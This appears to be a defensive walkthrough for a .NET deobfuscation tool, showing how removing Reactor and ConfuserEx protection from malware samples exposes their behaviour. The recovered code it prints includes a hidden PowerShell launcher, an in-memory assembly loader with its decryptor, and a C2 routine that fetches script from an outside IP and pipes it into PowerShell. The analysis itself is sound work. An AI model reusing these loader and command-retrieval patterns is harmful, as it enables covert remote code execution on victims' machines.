# Protection removal: before and after

This walkthrough follows **malware samples**, showing how protection removal exposes payload loading, command retrieval and process execution. The examples come from static CILantro **1.0.0 preparation** captures on 2026-10-16. No sample was executed and no command server was contacted.

## Samples and evidence

| Capture ID | Malware fixture | Behavior exposed |
| --- | --- | --- |
| `reactor-loader` | `Qbjuef.exe` | Decrypts embedded content, loads a managed stage in memory, finds a named type and invokes its method |
| `reactor-necrobit` | `Qafcakg.payload.Ptnifif.dll` | Encrypted method bodies conceal PowerShell process creation and another in-memory assembly loader |
| `confuser-tasking` | `confuser_06b9d08b33f2.dll` | Sends HTTP POST requests, decodes responses and sends received script content to PowerShell |
| Native extraction | `WindowsManagement.exe` | Native wrapper conceals a managed stage |

These are corpus filenames, not malware-family attributions. Identity is established by SHA-256:

```text
Qbjuef.exe
c8fab65dedd9c62a35cfab7e318225c42cc838d57fe0a1f072b195a1a779523b
Qafcakg.payload.Ptnifif.dll
e4e746f968a3ec89027484ab233d3d38c7778458a898d30f31bb74a2c97059d2
confuser_06b9d08b33f2.dll
06b9d08b33f2e22bfea6196867d35bb3cef7f11eb745d43017c7cb75183a8e3f
WindowsManagement.exe
094dbed0af6664af52375a711e0b8e4e8e7e66c6d47390e8263b16efba4d1995
```

**Before/after** labels name their checkpoint. Decrypting a method must precede inspecting its strings or control flow, so a pass-entry snippet can already contain earlier recovery. **Final C#** means ILSpy decompilation of a written output. **Recovered CIL** means an in-memory pass snapshot. `...` marks omitted instructions; display aliases are declared explicitly. Tokens refer to the input/in-memory method identity and can change on emission.

The [evidence JSON](assets/protection-removal-evidence.json) contains selected complete snapshots, method identities, pass diagnostics, output hashes, extraction records and the VM-removal audit. All three managed runs passed structural verification. This checks metadata and CIL, not execution equivalence or successful task delivery.

Windows blocked subsequent opening of the extracted `Zebekeadu.dll` and cleaned Qafcakg payload as malware. For those files, the guide uses extraction records and CIL captured during recovery, rather than claiming a subsequent decompiler inspection or downstream payload behavior.

## .NET Reactor

### Encrypted bodies hide PowerShell execution

**Question:** What does this protected payload do with a supplied command line?

**Where:** `reactor-necrobit`, token `0600009F`, originally `IkK0pg15BXAaK15L516.fZYkTP1rAPr8Mw2ADc8::wyN10B6AOx(System.String)`.

**Before `method-body-recovery` — the original stub reveals no behavior:**

```cil
IL_0000: nop
IL_0001: nop
IL_0002: nop
IL_0003: ret
```

**After body recovery — process creation appears, but the executable name is still protected:**

```cil
IL_0000: newobj System.Void System.Diagnostics.ProcessStartInfo::.ctor()
IL_0005: dup
IL_0006: ldc.i4 24246
IL_000B: call System.String fsG2DetHNZwQbapJJ1V.oqbU0utgcZtfXl5Wa74::kOBtAygYoF(System.Int32)
IL_0010: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_FileName(System.String)
IL_0015: dup
IL_0016: ldarg.0
IL_0017: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_Arguments(System.String)
...
IL_0040: call System.Diagnostics.Process System.Diagnostics.Process::Start(System.Diagnostics.ProcessStartInfo)
IL_0045: pop
```

**After subsequent constant recovery and cleanup — recovered CIL at `symbol-renaming`, excerpts:**

```cil
IL_0056: ldstr "powershell.exe"
IL_005B: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_FileName(System.String)
IL_0060: dup
IL_0061: ldarg.0
IL_0062: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_Arguments(System.String)
...
IL_0067: dup
IL_0068: ldc.i4 1
IL_006D: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_WindowStyle(System.Diagnostics.ProcessWindowStyle)
IL_0072: dup
IL_0073: ldc.i4 1
IL_0078: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(System.Boolean)
IL_007D: dup
IL_007E: ldc.i4 0
IL_0083: callvirt System.Void System.Diagnostics.ProcessStartInfo::set_UseShellExecute(System.Boolean)
IL_0088: call System.Diagnostics.Process System.Diagnostics.Process::Start(System.Diagnostics.ProcessStartInfo)
```

The executable is `powershell.exe`; the method uses its string argument as the command line, sets `WindowStyle` to `Hidden` (1), enables `CreateNoWindow`, disables shell execution, and calls `Process.Start`. Those are properties of the recovered payload code, not commands run during analysis. Required class-initialization calls remain outside the excerpt.

This run restored **313 bodies** and resolved **152 detected string sites**. The useful result is the recovered execution path, not just a larger instruction count.

The same payload also has an in-memory loading path. Token `0600008F` changes from a protected stub into recovered code that eventually contains:

```cil
IL_004A: call System.Reflection.Assembly System.Reflection.Assembly::Load(System.Byte[])
IL_004F: callvirt System.Type[] System.Reflection.Assembly::GetExportedTypes()
IL_0054: ldc.i4 0
IL_0059: ldelem.ref
```

This reveals assembly loading and exported-type discovery. It does not establish what that separately loaded assembly will do.

### Proxies hide an in-memory payload load

**Question:** Is the loader writing an executable to disk, or handing bytes directly to the CLR?

**Where:** `reactor-loader`, `delegate-proxy-analysis`, token `0600001A`, originally `QhbqOJN0Fee3C4K5k5.UIvLjIkIS82qklD7Gw::JJ4Z3OtjH()`.

**Before — a delegate field and proxy obscure the target:**

```cil
IL_006B: ldarg.0
IL_006C: ldfld System.Byte[] QhbqOJN0Fee3C4K5k5.UIvLjIkIS82qklD7Gw::bDSuRNVn1
IL_0071: ldsfld MuX4cvhmWNhAwWvDSS2 MuX4cvhmWNhAwWvDSS2::BXPho3ZLdq
IL_0076: call System.Reflection.Assembly MuX4cvhmWNhAwWvDSS2::sDYhFaFubx(System.Byte[],MuX4cvhmWNhAwWvDSS2)
```

**After — the framework operation becomes explicit:**

```cil
IL_006B: ldarg.0
IL_006C: ldfld System.Byte[] QhbqOJN0Fee3C4K5k5.UIvLjIkIS82qklD7Gw::bDSuRNVn1
IL_0071: nop
IL_0072: call System.Reflection.Assembly System.Reflection.Assembly::Load(System.Byte[])
```

The same pass exposes `Assembly.GetType` and `Type.GetMethod` in this method. It restores **1,230 proxy calls** across the sample. This particular site loads the byte array directly with `Assembly.Load(byte[])`; a disk-backed executable is not required by this path.

### Protected strings conceal the stage's entry method

**Question:** Which type and method does the loader invoke inside the loaded stage?

**Where:** the same `reactor-loader` method, now at `string-recovery`. `StringDecoder` below aliases `cyLqt16JuLuQiK9Qfv.NF8Q3InXt7oVQltBE3`.

**Before — type and method names are decoder results, excerpts:**

```cil
IL_0089: call System.String StringDecoder::VenS25X1DV(System.Int32)
...
IL_00A8: call System.String StringDecoder::VenS25X1DV(System.Int32)
```

**After — the reflection targets are readable, excerpts:**

```cil
IL_008A: ldstr "C1suCN5KK3yRESlsiP.eYE95NCJJsOvlnZmJA"
IL_008F: nop
IL_0090: callvirt System.Type System.Reflection.Assembly::GetType(System.String)
...
IL_00AA: ldstr "LXhc61f9Z"
IL_00AF: nop
IL_00B0: callvirt System.Reflection.MethodInfo System.Type::GetMethod(System.String)
IL_00B5: ldnull
IL_00B6: ldnull
IL_00B7: callvirt System.Object System.Reflection.MethodBase::Invoke(System.Object,System.Object[])
IL_00BC: pop
```

**Final C#, after the remaining flow and predicate cleanup:**

```csharp
Assembly assembly = Assembly.Load(byteArrayField_0000);
string name = "C1suCN5KK3yRESlsiP.eYE95NCJJsOvlnZmJA";
Type type = assembly.GetType(name);
string name2 = "LXhc61f9Z";
type.GetMethod(name2).Invoke(null, null);
```

This identifies a concrete next analysis target: type `C1suCN5KK3yRESlsiP.eYE95NCJJsOvlnZmJA`, method `LXhc61f9Z`. The result exposes the loader's intended invocation; it does not prove that invocation succeeded on a live host.

The same method has **one switch at the captured dispatcher-pass entry and none in its final captured body**. The complete loader stops looking like a dispatch loop and reads as an event notification followed by the assembly load and reflection calls above. The first dispatcher pass alone does not remove all its noise; later passes finish that transformation.

### Decryption and resource recovery expose the hidden stage

**Question:** Where do the bytes passed to `Assembly.Load` come from?

The `reactor-loader` byte-array field is processed by a decryption routine, token `06000018`. Before proxy and string recovery, that routine contains indirect framework calls and decoder lookups. **Final C# excerpts** expose the algorithm and data flow:

```csharp
TripleDES tripleDES = TripleDES.Create();
...
CryptoStream cryptoStream = new CryptoStream(memoryStream, ((SymmetricAlgorithm)tripleDES).CreateDecryptor(), CryptoStreamMode.Write);
...
((Stream)cryptoStream).Write(buffer, 0, count);
cryptoStream.FlushFinalBlock();
...
byteArrayField_0000 = memoryStream.ToArray();
```

The complete captured routine also establishes CBC mode, PKCS7 padding, and the key/IV. These fragments show a **payload decryptor preserved as program logic**. Removing Reactor must not delete it just because it uses cryptography.

The same run reports two distinct extraction results:

| Origin | Before | After |
| --- | --- | --- |
| Reactor resource bundle | `nkXbYoyJhFlJ5QXl4A.CZFLvot6mL92Di9HnX`, 50,895 encoded bytes | 52,224-byte decoded resource assembly; application streams `Qbjuef.g.resources` and `Iihysdqnl.Properties.Resources.resources` reattached |
| Interpreted in-memory load | Content reached through `KyVgypcyOSoGANSpXe::uMqwgnxr1` | `Zebekeadu.dll`, 92,672 bytes, recorded with origin `assemblyLoad` |

The resource assembly is a container for recovered resources; it is not automatically the malicious next-stage entry point. The separately recovered `assemblyLoad` artifact is the managed stage of interest. Their recorded hashes distinguish them:

```text
Decoded resource assembly:
bb8fb1ca76cb531bdbedcdafa851b5de6e86042350e7cc5cb121c0fe4f23ca2b
Zebekeadu.dll:
417032e561fe410a246fea4f580b7ae8de4a8cc5098a508931a78322916199dd
```

The extraction manifest records `Zebekeadu.dll` with resources `Cdte` and `lVVE`. Further inspection of that extracted DLL was blocked by Windows, so no claim about its internal malicious functions is made here. The captured parent code and extraction provenance already establish the hidden-stage loading path.

### Virtualization and protector retirement: follow their effect on the payload investigation

The `reactor-loader` sample also uses a VM around protector string-resolution dependencies. At token `0600004A`, **before reconstruction**, the method packages arguments and ends with:

```cil
IL_0026: ldc.i4 0
IL_002B: ldloc.0
IL_002C: ldnull
IL_002D: call System.Object[] JQhawTywsS1NVjM0U2D.H7iSNmyMGuPXNmAEDJn::RxryXcNYIa(System.Int32,System.Object,System.Object)
IL_0032: pop
IL_0033: ret
```

**After reconstruction**, that 18-instruction stub has a 5,480-instruction inferred CIL body. This is a reconstruction checkpoint, not evidence that 5,480 instructions of original application source were recovered. The reconstructed dependency and a lifted pool initializer are subsequently retired when their protection work is replaced.

The practical result is that the payload-loading strings above remain readable without retaining the original VM engine. A separate audit of the written assembly establishes:

```text
Original VM engines identified:             1
VM engine/nested declarations retained:     0
VM bytecode resource removed:
  yK5UxXIr2I53OoU4rx.cQo0ikDMfplHMV8mSA
Reconstructed protection-code disposition: retired-protector
Physical VM-removal gate:                   passed
```

This is protection machinery from a malware loader, not a virtualized malicious algorithm. The guide does not substitute it for an application-VM reconstruction claim. See [VM validation and limits](devirtualization.md).

### Native wrapping conceals the managed loader before CIL analysis starts

For the malware fixture `WindowsManagement.exe`, **before native-bootstrap extraction**, the payload is a Win32 resource `10/__/0` containing **8,387,267 encrypted bytes**. **After extraction**, the loader data yields a managed stage:

```text
Managed module:       stub.exe
Managed stage length: 14,724,608 bytes
Requested CLR:        v4.0.30319
Managed metadata:     6,155 types
SHA-256:
83ba5d833eba38f578eb8478f8961a0bddb63ff35016b40d8e0536b164ee1ed3
```

This capture invokes the static extractor only. It demonstrates getting past the native wrapper; it does not establish that this managed stage has had its own protection removed.

## ConfuserEx

### Section encryption hides the command-retrieval method

**Question:** Does the application retrieve and execute commands?

**Where:** `confuser-tasking`, token `0600006C`, the public tasking method taking a string identifier. Its complete obfuscated signature is recorded in the evidence.

**Before `confuserex-antitamper`:**

```text
Decoded instructions in the tasking method: 0
```

This is the reader's view of an encrypted body, not a valid empty implementation. **After section recovery:**

```text
Decoded instructions in the tasking method: 422
Switch instructions:                         4
```

The pass recovers **242 bodies** from the section at RVA `0x00002000` and reinstates field data for 48 fields. The recovered tasking method can now be analyzed, but its dispatchers and constants still hide its purpose.

After the remaining recovery, **final C# excerpts from that same method** include:

```csharp
byte[] array = generatedMethod_0171("https://146.70.147.27", Encoding.UTF8.GetBytes("P" + IgD2kDuq81HoiFA9fd0tVilj + "AUG-06"), Convert.FromBase64String("L51K9am2FffVTqqew4iP8aI7pZG/M9zx1Qvo9e1VPWIHqMqjjFxj54iwXN5TURk9mMzcj5yCto02Bz8hdoPZBlwExS6HXYRIutqGTO2rfPEscfwx8IRW/IfepQ+Xx82Y"));
...
ProcessStartInfo processStartInfo = new ProcessStartInfo("powershell");
processStartInfo.CreateNoWindow = true;
processStartInfo.RedirectStandardInput = true;
processStartInfo.UseShellExecute = false;
Process.Start(processStartInfo).StandardInput.WriteLine("$UUID='" + IgD2kDuq81HoiFA9fd0tVilj + "';" + Encoding.UTF8.GetString(array2) + ";exit");
```

The request result supplies script bytes, which the method decodes as UTF-8 and writes to PowerShell's standard input. The omitted code checks the response discriminator, copies the script portion, and sends an acknowledgement. The endpoint and encoded value shown are recovered specimen data, not contacted during analysis. This is the meaningful payoff of decrypting this body.

### Constants reveal the command interpreter and network protocol

**Where:** `confuser-tasking`, `confuserex-constants`, token `0600006C`. `ConstantGetter` aliases the exact Unicode-named generic getter recorded in the evidence.

**Before:**

```cil
IL_0092: ldc.i4 1763100277
IL_0097: br.s IL_0099
IL_0099: call System.String <Module>::ConstantGetter<System.String>(System.UInt32)
```

**After:**

```cil
IL_008E: nop
IL_008F: br.s IL_0091
IL_0091: ldstr "powershell"
```

The same method also reveals the command-server URL, protocol markers `"P"` and `"T"`, and the script wrapper strings. In the HTTP helper at input token `0600006B`, constants become `"Method"`, `"POST"`, `"ReadWriteTimeout"`, and `"Timeout"`.

**Before/after at the HTTP-method constant site** (a different Unicode getter, shown as `HttpConstantGetter`):

```cil
IL_0052: ldc.i4 143575047
IL_0057: br.s IL_0059
IL_0059: call System.String <Module>::HttpConstantGetter<System.String>(System.UInt32)
```

```cil
IL_004E: nop
IL_004F: br.s IL_0051
IL_0051: ldstr "POST"
```

Final decompilation of that helper shows a request stream being written, a response stream copied, and the returned bytes passed through the sample's decoder. This connects the recovered constants to command transport.

All **21 proven string sites** were rewritten. Another 34 array constants were decoded for reporting but not rewritten; complete constant-protection removal is not claimed.

### Flattened flow conceals the task-response decision

**Where:** `confuser-tasking`, `dispatcher-deobfuscation`, token `0600006C`, after section decryption.

**Before — the task method starts with arithmetic dispatch:**

```cil
IL_0000: nop
IL_0001: ldc.i4 -1437685091
IL_0006: ldc.i4 -1339542675
IL_000B: xor
IL_000C: dup
IL_000D: stloc.s V_9
IL_000F: ldc.i4.s 12
IL_0011: rem.un
IL_0012: switch (IL_010A, IL_012D, IL_0148, IL_00F5, IL_0062, IL_00BC, IL_0001, IL_009E, IL_0076, IL_004C, IL_015C, IL_00B1)
IL_0047: br IL_015C
```

**After this pass:** the method has **zero switches**, down from four, and later cleanup yields the readable response branch below. **Final C# excerpts:**

```csharp
if (array[0] == 202)
{
	uint num = (uint)(array[1] + (array[2] << 8) + (array[3] << 16) + (array[4] << 24));
	byte[] array2 = new byte[array.Length - 5];
	Buffer.BlockCopy(array, 5, array2, 0, array2.Length);
	Thread.Sleep(5000);
    ...
}
if (array[0] == 244)
{
	Environment.Exit(1);
}
```

Together with the execution excerpt above, this exposes two protocol decisions: discriminator 202 selects the script-processing branch, while discriminator 244 exits the process. These are decisions in the malware's tasking method.

The pass resolves 5,043 dispatcher edges in 127 methods across the sample. That does not authorize removing ordinary application switches.

### Renaming and cleanup aid navigation without erasing the tasking logic

The HTTP helper changes from an invisible Unicode identifier at input token `0600006B` to `generatedMethod_0171` in the output. The public tasking method's obfuscated API name remains. Use the rename map and signature to connect the original and final declarations.

Runtime cleanup removes 53 dead methods and subsequent cleanup removes nine more; the final assembly has 21 types and 185 methods. Its tasking and HTTP routines survive. Startup helpers also remain: the section decryptor's later initializer stages were not fully interpreted. Recovering the command path is not proof that every anti-debug or anti-dump effect was removed.

## What these samples do and do not demonstrate

| Protection | Malware evidence in this guide |
| --- | --- |
| Reactor encrypted bodies / NecroBit | Protected payload stub becomes a PowerShell-launching method |
| Reactor strings, constants, predicates and flow | Payload reflection targets and decryptor become inspectable; loader dispatch noise disappears after the full pipeline |
| Reactor reference proxies | Indirect loader call becomes `Assembly.Load(byte[])` |
| Reactor resources and nested content | Resource container decoded; an interpreted assembly load yields the hashed `Zebekeadu.dll` artifact |
| Reactor VM and runtime cleanup | VM dependencies of string recovery reconstructed and retired, with physical absence audited; no malicious application-VM algorithm reconstruction claim |
| Reactor native bootstrap | Actual malware wrapper yields a parseable managed stage |
| ConfuserEx anti-tamper, constants and flow | Encrypted tasking method becomes readable HTTP/PowerShell command-processing logic |
| ConfuserEx names and helpers | Network-helper mapping and physical dead-method removal; required/surviving startup code remains |
| ConfuserEx reference proxies, dedicated encrypted resources and packer | No removal demonstration for these configurations in this fixture; do not use Reactor evidence as a substitute |
| Complete anti-debug / anti-dump / licensing removal | Not established by these captures |

See [support and limitations](compatibility.md). Malware behavior described here is inferred from recovered code, not confirmed by detonation or a malware-family label.

## Inspect and reproduce

For routine analysis, use the normal interface with a fresh case folder:

```powershell
.\cilantro.exe C:\cases\Qbjuef.exe -o C:\cases\qbjuef-review
```

Follow **OUTPUT** to the cleaned assembly, HTML report and extracted artifacts. Compare the original and cleaned method in ILSpy or dnSpyEx. The change map explains transformations; the rename map relates surviving identifiers. Encrypted originals can fail to decompile, which is why the guide records intermediate CIL too.

To reproduce pass-boundary captures, use the [capture source](assets/protection-removal-capture.cs) from the repository root with the .NET 10 SDK:

```powershell
dotnet new console -f net10.0 -o artifacts/protection-capture
dotnet add artifacts/protection-capture reference src/Cilantro.Core/Cilantro.Core.csproj
Get-Content docs/assets/protection-removal-capture.cs -Raw | Set-Content artifacts/protection-capture/Program.cs
dotnet run -c Release --project artifacts/protection-capture -- C:\cases\Qbjuef.exe artifacts/protection-review/reactor-loader 06000018,06000019,0600001A,0600004A,060003CD
```

The optional third argument selects input method tokens, so useful application methods can be captured instead of the helper's default small-body examples. For `Qafcakg.payload.Ptnifif.dll`, select `0600009F,0600008F`. For the ConfuserEx fixture, select `0600006B,0600006C`. The helper records the default recognized-root pipeline without recursive child recovery and writes `frames.json`, `identity.json`, `run.json`, cleaned output and normal reports. The checked-in JSON retains selected methods; long VM-body captures explicitly mark truncation.

The [native extraction source](assets/protection-removal-native-capture.cs) can replace `Program.cs` in that scratch project; it takes the input path and prints an inventory without writing or executing the managed stage.

For the Qbjuef run, check physical VM retirement separately:

```powershell
dotnet build src/Cilantro.Cli -c Release
pwsh -File corpus/verify-vm-removal.ps1 -RunPath artifacts/protection-review/reactor-loader/run.json -ToolDirectory src/Cilantro.Cli/bin/Release/net10.0
```

Recorded hashes identify the captured outputs. Regeneration can differ with build or metadata emission changes. These examples supplement [corpus validation](corpus.md), not release-candidate validation.
